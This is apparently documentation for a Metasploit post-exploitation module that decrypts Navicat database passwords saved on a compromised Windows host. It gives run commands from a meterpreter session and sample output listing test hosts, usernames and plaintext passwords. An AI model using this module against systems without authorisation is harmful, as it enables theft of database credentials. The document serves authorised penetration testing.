## Vulnerable Application

This module can decrypt the password of navicat, If the user chooses to remember the password.

  Analysis of encryption algorithm [here](https://github.com/HyperSine/how-does-navicat-encrypt-password).

  You can find its official website [here](https://navicat.com/).

## Verification Steps

  1. Download the latest installer of Navicat.
  2. Use navicat to log in to DB server.
  3. Remember to save the account password.
  4. Get a `meterpreter` session on a Windows host.
  5. Do: `run post/windows/gather/credentials/navicat`
  6. If the session file is saved in the system, the host, port, user name and plaintext password will be printed.

## Options

### NCX_PATH

Specify the path of the NCX export file. e.g.: connections.ncx

## Scenarios

```
meterpreter > run post/windows/gather/credentials/navicat 

*] Gathering Navicat password information from WIN-79MR8QJM50N 
Navicat Sessions 
================

Name            Protocol  Hostname   Port   Username  Password
----            --------  --------   ----   --------  --------
mongodb         mongodb   localhost  27017  user      password  
test_mysql      mysql     localhost  3306   root      test_mysql_password 
test_oracle     oracle    127.0.0.1  1521   user      password
test_pg         postgres  localhost  5432   postgres  test_pg_password
test_sqlserver  mssql     127.0.0.1  1433   user      password

[+] Session info stored in: /home/kali-team/.msf4/loot/20221002233644_default_192.168.80.128_host.navicat_ses_919319.txt
[*] Post module execution completed
meterpreter > 
```

* Specify **NCX_PATH**

```
msf6 post(windows/gather/credentials/navicat) > set ncx_path C:\\Users\\FireEye\\Desktop\\connections.ncx
ncx_path => C:\Users\FireEye\Desktop\connections.ncx
msf6 post(windows/gather/credentials/navicat) > run

[*] Gathering Navicat password information from WIN-79MR8QJM50N
[*] Looking for C:\Users\FireEye\Desktop\connections.ncx
[+] navicat.ncx saved to /home/kali-team/.msf4/loot/20221002234356_default_192.168.80.128_navicat.creds_838577.txt
Navicat Sessions
================

Name            Protocol  Hostname   Port   Username  Password
----            --------  --------   ----   --------  --------
mongodb         mongodb   localhost  27017  user      password  
test_mysql      mysql     localhost  3306   root      test_mysql_password 
test_oracle     oracle    127.0.0.1  1521   user      password
test_pg         postgres  localhost  5432   postgres  test_pg_password
test_sqlserver  mssql     127.0.0.1  1433   user      password

[+] Session info stored in: /home/kali-team/.msf4/loot/20221002234356_default_192.168.80.128_host.navicat_ses_522370.txt
[*] Finished processing C:\Users\FireEye\Desktop\connections.ncx
[*] Post module execution completed


```